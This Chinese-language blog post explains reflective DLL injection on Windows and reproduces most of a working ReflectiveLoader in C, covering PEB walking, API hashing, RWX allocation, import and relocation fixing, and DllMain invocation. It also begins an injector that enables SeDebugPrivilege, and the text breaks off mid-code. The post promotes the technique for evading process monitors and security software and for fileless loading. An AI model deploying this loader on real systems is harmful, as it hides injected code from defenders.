---
title: 反射型dll注入
date: 2021-01-31 00:00:00
categories: Code
tags: windows, process-inject, Reflective, secuity
cover: https://p1.ssl.qhimg.com/t011b2047aa5101086b.jpg
description: 反射式注入方式并没有通过LoadLibrary等API来完成DLL的装载，DLL并没有在操作系统中”注册”自己的存在，因此ProcessExplorer等软件也无法检测出进程加载了该DLL。
---

# 核心思路

反射型dll注入与其他注入不同的是，其不需要使用LoadLibrary这一函数，而是自己来实现整个装载过程。我们可以为待注入的DLL添加一个导出函数，ReflectiveLoader，这个函数实现的功能就是装载它自身。那么我们只需要将这个DLL文件写入目标进程的虚拟空间中，然后通过DLL的导出表找到这个ReflectiveLoader并调用它，我们的任务就完成了。

于是，我们的任务就转到了编写这个ReflectiveLoader上。由于ReflectiveLoader运行时所在的DLL还没有被装载，它在运行时会受到诸多的限制，例如无法正常使用全局变量等。而且，由于我们无法确认我们究竟将DLL文件写到目标进程哪一处虚拟空间上，所以我们编写的ReflectiveLoader必须是地址无关的。也就是说，ReflectiveLoader中的代码无论处于虚拟空间的哪个位置，它都必须能正确运行。这样的代码被我们称为“地址无关代码”(position-independent code, PIC)。

# 优点

 反射式注入方式并没有通过LoadLibrary等API来完成DLL的装载，DLL并没有在操作系统中”注册”自己的存在，因此ProcessExplorer等软件也无法检测出进程加载了该DLL。利用解密磁盘上加密的文件、网络传输等方式避免文件落地，DLL文件可以不一定是本地文件，可来自网络等，总之将数据写到缓冲区即可。
由于它没有通过系统API对DLL进行装载，操作系统无从得知被注入进程装载了该DLL，所以检测软件也无法检测它。同时，由于操作流程和一般的注入方式不同，反射式DLL注入被安全软件拦截的概率也会比一般的注入方式低。

# ReflectiveLoader的实现

ReflectiveLoader要完成的任务是对自身的装载。所谓的“装载”具体而言是什么意义呢？

所谓“装载”，最重要的一点就是要将自身合适地展开到虚拟空间中。我们都知道在PE文件包含了许多节，而为了节省存储空间，这些节在PE文件中比较紧密地凑在一起的。而在广阔虚拟空间中，这些节就可以映射到更大的空间中去。更不用说还存在着.bss这样的在PE文件中不占空间，而要在虚拟空间中占据位置的节了。ReflectiveLoader需要做的一件很重要的事就是按照规则去将这些节映射到对应的地址去。

同时，由于DLL中可能会用到其他DLL的函数，装载一个DLL还需要将这个DLL依赖的其他动态库装入内存，并修改DLL的IAT指向到合适的位置，这样对其他DLL函数的引用才能正确运作。

虽然我们上文提到，ReflectiveLoader的代码是地址无关的，但是该DLL的其他部分的代码却并不是这样的。在一份源代码编译、链接成为DLL时，编译器都是假设该DLL会加载到一个固定的位置，生成的代码也是基于这一个假设。在反射式注入DLL的时候，我们不太可能申请到这个预先设定好的地址，所以我们需要面对一个重定位（Rebasing）的问题。

以上就是ReflectiveLoader所面对的问题。接下来我们看看它是如何解决这些问题的。

## 0） 定位DLL文件在内存中的基址

ReflectiveLoader做的第一件事就是查找自身所在的DLL具体被写入了哪个位置。

ReflectiveLoader首先利用一个重定位技巧找到自身所在的大致位置：

```c
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)_ReturnAddress(); }
```

其中函数_ReturnAddress()返回的是当前调用函数的返回地址，也就是caller()的下一条指令的地址。这个地址位于ReflectiveLoader的内部，而ReflectiveLoader位于被注入的DLL文件内部，因此这个地址离DLL文件的头部不远了。

借助上文找到的地址，我们逐字节的向上遍历，当查找到符合PE格式的文件头之后，就可以认为找到了DLL文件在内存中的地址了。

```c
// STEP 0: calculate our images current base address

// we will start searching backwards from our callers return address.
uiLibraryAddress = caller();

// loop through memory backwards searching for our images base address
// we dont need SEH style search as we shouldnt generate any access violations with this
while( TRUE )
{
	if( ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE )
	{
		uiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
		// some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),
		// we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.
        //一些 x64的 dll 可以触发一个伪造的签名(IMAGE _ dos _ signature = ‘ POP r10’) ,
	    //我们对 e _ lfanew 进行健全性检查，上限值为1024，以避免出现问题
		if( uiHeaderValue >= sizeof(IMAGE_DOS_HEADER) && uiHeaderValue < 1024 )
		{
			uiHeaderValue += uiLibraryAddress;
			// break if we have found a valid MZ/PE header
			if( ((PIMAGE_NT_HEADERS)uiHeaderValue)->Signature == IMAGE_NT_SIGNATURE )
				break;
		}
	}
	uiLibraryAddress--;
}
```

## 1）获取所需的系统API

ReflectiveLoader启动时，目标进程已在正常的运行状态中了，此时目标进程已经装载了一些核心的DLL文件。我们可以搜索这些DLL文件，查找需要的API函数，为后续操作提供方便。具体地，我们需要的函数是kernel32.dll中的LoadLibraryA(), GetProcAddress()， VirtualAlloc()以及ntdll.dll中的NtFlushInstructionCache()函数。

```c
LOADLIBRARYA pLoadLibraryA     = NULL;
GETPROCADDRESS pGetProcAddress = NULL;
VIRTUALALLOC pVirtualAlloc     = NULL;
NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;
```

ReflectiveLoader借助PEB (Process Environment Block)来查找kernel32.dll和ntdll.dll在内存中的位置。这一部分需要对TEB (Thread Environment Block)和PEB (Process Environment Block)有一个基本的了解。

在x64系统下，PEB在gs段的60h偏移量处，在x86系统下，PEB在fs段的30h偏移量处

PEB结构如下，具体使用windbg可查看

```c
// struct _PEB is defined in Winternl.h but it is incomplete
// WinDbg> dt -v ntdll!_PEB
typedef struct __PEB // 65 elements, 0x210 bytes
{
   BYTE bInheritedAddressSpace;
   BYTE bReadImageFileExecOptions;
   BYTE bBeingDebugged;
   BYTE bSpareBool;
   LPVOID lpMutant;
   LPVOID lpImageBaseAddress;
   PPEB_LDR_DATA pLdr;
   LPVOID lpProcessParameters;
   LPVOID lpSubSystemData;
   LPVOID lpProcessHeap;
   PRTL_CRITICAL_SECTION pFastPebLock;
   LPVOID lpFastPebLockRoutine;
   LPVOID lpFastPebUnlockRoutine;
   DWORD dwEnvironmentUpdateCount;
   LPVOID lpKernelCallbackTable;
   DWORD dwSystemReserved;
   DWORD dwAtlThunkSListPtr32;
   PPEB_FREE_BLOCK pFreeList;
   DWORD dwTlsExpansionCounter;
   LPVOID lpTlsBitmap;
   DWORD dwTlsBitmapBits[2];
   LPVOID lpReadOnlySharedMemoryBase;
   LPVOID lpReadOnlySharedMemoryHeap;
   LPVOID lpReadOnlyStaticServerData;
   LPVOID lpAnsiCodePageData;
   LPVOID lpOemCodePageData;
   LPVOID lpUnicodeCaseTableData;
   DWORD dwNumberOfProcessors;
   DWORD dwNtGlobalFlag;
   LARGE_INTEGER liCriticalSectionTimeout;
   DWORD dwHeapSegmentReserve;
   DWORD dwHeapSegmentCommit;
   DWORD dwHeapDeCommitTotalFreeThreshold;
   DWORD dwHeapDeCommitFreeBlockThreshold;
   DWORD dwNumberOfHeaps;
   DWORD dwMaximumNumberOfHeaps;
   LPVOID lpProcessHeaps;
   LPVOID lpGdiSharedHandleTable;
   LPVOID lpProcessStarterHelper;
   DWORD dwGdiDCAttributeList;
   LPVOID lpLoaderLock;
   DWORD dwOSMajorVersion;
   DWORD dwOSMinorVersion;
   WORD wOSBuildNumber;
   WORD wOSCSDVersion;
   DWORD dwOSPlatformId;
   DWORD dwImageSubsystem;
   DWORD dwImageSubsystemMajorVersion;
   DWORD dwImageSubsystemMinorVersion;
   DWORD dwImageProcessAffinityMask;
   DWORD dwGdiHandleBuffer[34];
   LPVOID lpPostProcessInitRoutine;
   LPVOID lpTlsExpansionBitmap;
   DWORD dwTlsExpansionBitmapBits[32];
   DWORD dwSessionId;
   ULARGE_INTEGER liAppCompatFlags;
   ULARGE_INTEGER liAppCompatFlagsUser;
   LPVOID lppShimData;
   LPVOID lpAppCompatInfo;
   UNICODE_STR usCSDVersion;
   LPVOID lpActivationContextData;
   LPVOID lpProcessAssemblyStorageMap;
   LPVOID lpSystemDefaultActivationContextData;
   LPVOID lpSystemAssemblyStorageMap;
   DWORD dwMinimumStackCommit;
} _PEB, * _PPEB;
```

ldr 指向PEB_LDR_DATA结构的指针，该结构包含有关进程的已加载模块的信息。参考：[https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data，结构如下：](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data，结构如下：)

```c
// WinDbg> dt -v ntdll!_PEB_LDR_DATA
typedef struct _PEB_LDR_DATA //, 7 elements, 0x28 bytes
{
   DWORD dwLength;
   DWORD dwInitialized;
   LPVOID lpSsHandle;
   LIST_ENTRY InLoadOrderModuleList;
   LIST_ENTRY InMemoryOrderModuleList;
   LIST_ENTRY InInitializationOrderModuleList;
   LPVOID lpEntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;
```

PPEB_LDR_DATA中的InMemoryOrderModuleList是一个双向链接列表的头部，该列表包含该过程的已加载模块，列表中的每个项目都是指向LDR_DATA_TABLE_ENTRY结构的指针。

LIST_ENTRY结构如下：

```c
typedef struct _LIST_ENTRY {
   struct _LIST_ENTRY *Flink;
   struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;
```

LDR_DATA_TABLE_ENTRY结构如下：

```c
// WinDbg> dt -v ntdll!_LDR_DATA_TABLE_ENTRY
//__declspec( align(8) )
typedef struct _LDR_DATA_TABLE_ENTRY
{
	//LIST_ENTRY InLoadOrderLinks; // As we search from PPEB_LDR_DATA->InMemoryOrderModuleList we dont use the first entry.
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STR FullDllName;
	UNICODE_STR BaseDllName;
	ULONG Flags;
	SHORT LoadCount;
	SHORT TlsIndex;
	LIST_ENTRY HashTableEntry;
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
```

其中的三个LIST_ENTRY是三个链表，按照不同的顺序规则将当前进程加载的所有模块链接起来。通过遍历其中的任意一个LIST_ENTRY，我们就可以获得所有模块的基地址，具体方法就不细致阐述了。

在获取了模块基地址之后，通过对PE文件的解析，找到DLL文件的导出表，再根据导出表就可以找到任一导出函数的地址了。对PE文件的解析有太多文章，这里也不细致阐述了。

在此，我们得到了函数LoadLibraryA(), GetProcAddress(), VirtualAlloc()以及NtFlushInstructionCache()。它们将在之后被用到。

 代码如下：

```c
// STEP 1: process the kernels exports for the functions our loader needs...

// get the Process Enviroment Block
#ifdef WIN_X64
	uiBaseAddress = __readgsqword( 0x60 );
#else
#ifdef WIN_X86
	uiBaseAddress = __readfsdword( 0x30 );
#else WIN_ARM
	uiBaseAddress = *(DWORD *)( (BYTE *)_MoveFromCoprocessor( 15, 0, 13, 0, 2 ) + 0x30 );
#endif
#endif

	// get the processes loaded modules. ref: http://msdn.microsoft.com/en-us/library/aa813708(VS.85).aspx
	uiBaseAddress = (ULONG_PTR)((_PPEB)uiBaseAddress)->pLdr;

	// get the first entry of the InMemoryOrder module list
	uiValueA = (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)->InMemoryOrderModuleList.Flink;
	while( uiValueA )
	{
		// get pointer to current modules name (unicode string)
		uiValueB = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.pBuffer;
		// set bCounter to the length for the loop
		usCounter = ((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.Length;
		// clear uiValueC which will store the hash of the module name
		uiValueC = 0;

		// compute the hash of the module name...
		do
		{
			uiValueC = ror( (DWORD)uiValueC );
			// normalize to uppercase if the madule name is in lowercase
			if( *((BYTE *)uiValueB) >= 'a' )
				uiValueC += *((BYTE *)uiValueB) - 0x20;
			else
				uiValueC += *((BYTE *)uiValueB);
			uiValueB++;
		} while( --usCounter );

		// compare the hash with that of kernel32.dll
		if( (DWORD)uiValueC == KERNEL32DLL_HASH )
		{
			// get this modules base address
			uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;

			// get the VA of the modules NT Header
			uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

			// uiNameArray = the address of the modules export directory entry
			uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

			// get the VA of the export directory
			uiExportDir = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

			// get the VA for the array of name pointers
			uiNameArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames );

			// get the VA for the array of name ordinals
			uiNameOrdinals = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals );

			usCounter = 3;

			// loop while we still have imports to find
			while( usCounter > 0 )
			{
				// compute the hash values for this function name
				dwHashValue = hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );

				// if we have found a function we want we get its virtual address
				if( dwHashValue == LOADLIBRARYA_HASH || dwHashValue == GETPROCADDRESS_HASH || dwHashValue == VIRTUALALLOC_HASH )
				{
					// get the VA for the array of addresses
					uiAddressArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

					// use this functions name ordinal as an index into the array of name pointers
					uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );

					// store this functions VA
					if( dwHashValue == LOADLIBRARYA_HASH )
						pLoadLibraryA = (LOADLIBRARYA)( uiBaseAddress + DEREF_32( uiAddressArray ) );
					else if( dwHashValue == GETPROCADDRESS_HASH )
						pGetProcAddress = (GETPROCADDRESS)( uiBaseAddress + DEREF_32( uiAddressArray ) );
					else if( dwHashValue == VIRTUALALLOC_HASH )
						pVirtualAlloc = (VIRTUALALLOC)( uiBaseAddress + DEREF_32( uiAddressArray ) );

					// decrement our counter
					usCounter--;
				}

				// get the next exported function name
				uiNameArray += sizeof(DWORD);

				// get the next exported function name ordinal
				uiNameOrdinals += sizeof(WORD);
			}
		}
		else if( (DWORD)uiValueC == NTDLLDLL_HASH )
		{
			// get this modules base address
			uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;

			// get the VA of the modules NT Header
			uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

			// uiNameArray = the address of the modules export directory entry
			uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

			// get the VA of the export directory
			uiExportDir = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

			// get the VA for the array of name pointers
			uiNameArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames );

			// get the VA for the array of name ordinals
			uiNameOrdinals = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals );

			usCounter = 1;

			// loop while we still have imports to find
			while( usCounter > 0 )
			{
				// compute the hash values for this function name
				dwHashValue = hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );

				// if we have found a function we want we get its virtual address
				if( dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH )
				{
					// get the VA for the array of addresses
					uiAddressArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

					// use this functions name ordinal as an index into the array of name pointers
					uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );

					// store this functions VA
					if( dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH )
						pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)( uiBaseAddress + DEREF_32( uiAddressArray ) );

					// decrement our counter
					usCounter--;
				}

				// get the next exported function name
				uiNameArray += sizeof(DWORD);

				// get the next exported function name ordinal
				uiNameOrdinals += sizeof(WORD);
			}
		}

		// we stop searching when we have found everything we need.
		if( pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache )
			break;

		// get the next entry
		uiValueA = DEREF( uiValueA );
	}
```

## 2） 重新装载DLL

虽然在ReflectiveLoader运行时，DLL文件已经在进程内存中了，但是要装载这个DLL，我们还需要更大的空间。借助在上一步步得到的函数VirtualAlloc()，我们可以分配一片更大的内存空间用于加载DLL。在PE头中的IMAGE_OPTIONAL_HEADER结构体中的SizeOfImage成员记载DLL被装载后的大小，我们按照这个大小分配内存即可。

```c
uiBaseAddress = (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
```

uiBaseAddress记录了VirtualAlloc的返回值，也就是分配内存空间的起始地址。于是uiBaseAddress就成为了DLL被装载后的基地址。

## 3） 复制PE文件头和各个节

分配了用于装载的空间后，ReflectiveLoader将DLL文件的头部(也就是DOS文件头、DOS插桩代码和PE文件头)复制到新的空间的首部。再根据PE文件的节表将各个节复制到相应的位置中.

```c
  // STEP 3: load in all of our sections and header...

  // we must now copy over the headers
uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
uiValueB = uiLibraryAddress;
uiValueC = uiBaseAddress;

while( uiValueA-- )
	*(BYTE *)uiValueC++ = *(BYTE *)uiValueB++;

// uiValueA = the VA of the first section
uiValueA = ( (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader );

// itterate through all sections, loading them into memory.
uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
while( uiValueE-- )
{
	// uiValueB is the VA for this section
	uiValueB = ( uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress );

	// uiValueC if the VA for this sections data
	uiValueC = ( uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData );

	// copy the section over
	uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;

	while( uiValueD-- )
		*(BYTE *)uiValueB++ = *(BYTE *)uiValueC++;

	// get the VA of the next section
	uiValueA += sizeof( IMAGE_SECTION_HEADER );
}
```

## 4） 处理DLL的引入表

被注入的DLL可能还依赖于其他的DLL，因此我们还需要装载这些被依赖的DLL，并修改本DLL的引入表，使这些被引入的函数能正常运行。

PE文件的引入表是一个元素为IMAGE_IMPORT_DESCRIPTOR的数组。每一个被依赖的DLL都对应着数组中的一个元素。下图表示了IMAGE_IMPORT_DESCRIPTOR结构以及我们需要进行的处理。

[](http://image.3001.net/images/20171018/15083360941230.png)

我们要做的就是根据IMAGE_IMPORT_DESCRIPTOR中的NAME成员找到DLL的名称，根据名称装载这些被依赖的DLL。 IMAGE_IMPORT_DESCRIPTOR中的OriginalFirstThunk指示了要从该DLL中引入哪些函数。有的函数是由名称导入的，此时IMAGE_THUNK_DATA会指向这个函数名；有的函数是由函数序号导入，此时分析IMAGE_THUNK_DATA我们会得到这个序号。无论是以什么方式导入，我们都要需要找到对应的函数，然后将其地址填入FirstThunk指向的IMAGE_THUNK_DATA数组中。装载这些被依赖的DLL就不需要我们手工操作了，我们直接利用步骤1）中获得的LoadLibraryA()来装载它们。对于那些通过函数名导入的函数来说，我们可以直接用GetProcAddress()来得到它们的地址；而对于通过序数导入的函数来说，则需要我们再次手工分析PE文件的导出表来找到它们的位置。

在得到所需的函数的地址后，将它们填入上图的相应位置，这样我们就完成了对引入表的处理了。

```c

// STEP 4: process our images import table...

// uiValueB = the address of the import directory
uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];

// we assume their is an import table to process
// uiValueC is the first entry in the import table
uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );

// itterate through all imports
while( ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name )
{
	// use LoadLibraryA to load the imported module into memory
	uiLibraryAddress = (ULONG_PTR)pLoadLibraryA( (LPCSTR)( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name ) );

	// uiValueD = VA of the OriginalFirstThunk
	uiValueD = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk );

	// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
	uiValueA = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk );

	// itterate through all imported functions, importing by ordinal if no name present
	while( DEREF(uiValueA) )
	{
		// sanity check uiValueD as some compilers only import by FirstThunk
		if( uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
		{
			// get the VA of the modules NT Header
			uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

			// uiNameArray = the address of the modules export directory entry
			uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

			// get the VA of the export directory
			uiExportDir = ( uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

			// get the VA for the array of addresses
			uiAddressArray = ( uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

			// use the import ordinal (- export ordinal base) as an index into the array of addresses
			uiAddressArray += ( ( IMAGE_ORDINAL( ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal ) - ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->Base ) * sizeof(DWORD) );

			// patch in the address for this imported function
			DEREF(uiValueA) = ( uiLibraryAddress + DEREF_32(uiAddressArray) );
		}
		else
		{
			// get the VA of this functions import by name struct
			uiValueB = ( uiBaseAddress + DEREF(uiValueA) );

			// use GetProcAddress and patch in the address for this imported function
			DEREF(uiValueA) = (ULONG_PTR)pGetProcAddress( (HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name );
		}
		// get the next imported function
		uiValueA += sizeof( ULONG_PTR );
		if( uiValueD )
			uiValueD += sizeof( ULONG_PTR );
	}

	// get the next import
	uiValueC += sizeof( IMAGE_IMPORT_DESCRIPTOR );
}
```

## 5） 对DLL进行重定位

 被注入的DLL只有其ReflectiveLoader中的代码是故意写成地址无关、不需要重定位的，其他部分的代码则需要经过重定位才能正确运行。幸运的是DLL文件提供了我们进行重定位所需的所有信息，这是因为每一个DLL都具有加载不到预定基地址的可能性，所以每一个DLL都对自身的重定位做好了准备。

 PE可选印象头的DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]就指向了重定位表。重定位表的数据结构如下：

```c
typedef struct _IMAGE_BASE_RELOCATION {
    DWORD   VirtualAddress;
    DWORD   SizeOfBlock;
//  WORD    TypeOffset[1];
} IMAGE_BASE_RELOCATION;
typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;
```

从定义上看，IMAGE_BASE_RELOCATION只包含了两个DWORD，其实在内存中它之后还跟了若干个大小为两个字节的元素，就是定义中被注释掉的“WORD Typeoffset[1]“。IMAGE_BASE_RELOCATION结构和后面紧跟的若干个Typeoffset组成了一个块，其大小为结构体中的SizeOfBlock。因此，Typeoffset的数量可以根据SizeofBlock算出。当一个块结束时，后面紧跟的就是下一个块。若SizeofBlock为0则标志着重定位表结束了。

[](http://image.3001.net/images/20171018/15083359661707.png)

Typeoffset的高4位代表重定位类型，一般为3，低12位则表示重定位地址。这个地址和IMAGE_BASE_RELOCATION中的VirtualAddress加起来则指向一个需要重定位的指令。

找到需要重定位的地点之后，怎么重定位呢？前文说到Typeoffset指示了多种重定位类型，其中最常见的为3，在此我只介绍这种情况。其他重定位类型的主体思想基本是相似的，只有细微的不同。

我们首先计算得到基地址的偏移量，也就是实际的DLL加载地址减去DLL的推荐加载地址。DLL推荐加载地址保存在NT可选印象头中的ImageBase成员中，而实际DLL加载地址则是我们在第2）步中函数VirtualAlloc()的返回值。然后我们将VirtualAddress和Typeoffset合力组成的地址所指向的双字加上这个偏移量，重定位就完成了。

```c
*(DWORD*)(VirtualAddress + Typeoffset的低12位) += （实际DLL加载地址 – 推荐DLL加载地址）
```

代码如下：

```c
   // STEP 5: process all of our images relocations...

// calculate the base address delta and perform relocations (even if we load at desired image base)
uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;

// uiValueB = the address of the relocation directory
uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];

// check if their are any relocations present
if( ((PIMAGE_DATA_DIRECTORY)uiValueB)->Size )
{
	// uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
	uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );

	// and we itterate through all entries...
	while( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock )
	{
		// uiValueA = the VA for this relocation block
		uiValueA = ( uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress );

		// uiValueB = number of entries in this relocation block
		uiValueB = ( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof( IMAGE_RELOC );

		// uiValueD is now the first entry in the current relocation block
		uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);

		// we itterate through all the entries in the current block...
		while( uiValueB-- )
		{
			// perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
			// we dont use a switch statement to avoid the compiler building a jump table
			// which would not be very position independent!
			if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64 )
				*(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
			else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW )
				*(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
			else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH )
				*(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
			else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW )
				*(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);

			// get the next entry in the current relocation block
			uiValueD += sizeof( IMAGE_RELOC );
		}

		// get the next entry in the relocation directory
		uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
	}
}
```

## 6） 调用DLL入口点

至此，ReflectiveLoader的任务全部完成，我们最后调用第1）步得到的NtFlushInstructionCache()清除指令缓存以避免问题。最后ReflectiveLoader将控制权转交给DLL文件的入口点，这个入口点可以通过NT可选印象头中的AddressOfEntryPoint找到。一般地，它会完成C运行库的初始化，执行一系列安全检查并调用dllmain。

```c

	// STEP 6: call our images entry point

	// uiValueA = the VA of our newly loaded DLL/EXE's entry point
	uiValueA = ( uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint );

	// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
	pNtFlushInstructionCache( (HANDLE)-1, NULL, 0 );

	// call our respective entry point, fudging our hInstance value
#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
	// if we are injecting a DLL via LoadRemoteLibraryR we call DllMain and pass in our parameter (via the DllMain lpReserved parameter)
	((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter );
#else
	// if we are injecting an DLL via a stub we call DllMain with no parameter
	((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL );
#endif

	// STEP 7: return our new entry point address so whatever called us can call DllMain() if needed.
	return uiValueA;
```

# inject的实现

## 总体流程

利用CreateFileA加载reflective_dll得到句柄

```c
hFile = CreateFileA( cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
```

通过GetFileSize得到reflective_dll文件大小

```c
dwLength = GetFileSize( hFile, NULL );
```

分配一块堆内存利用ReadFile去将reflective_dll读入进程内存空间。

```c
lpBuffer = HeapAlloc( GetProcessHeap(), 0, dwLength );
if( !lpBuffer )
    BREAK_WITH_ERROR( "Failed to get the DLL file size" );

if( ReadFile( hFile, lpBuffer, dwLength, &dwBytesRead, NULL ) == FALSE )
	BREAK_WITH_ERROR( "Failed to alloc a buffer!" );
```

提权

```c
if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
{
	priv.PrivilegeCount           = 1;
	priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
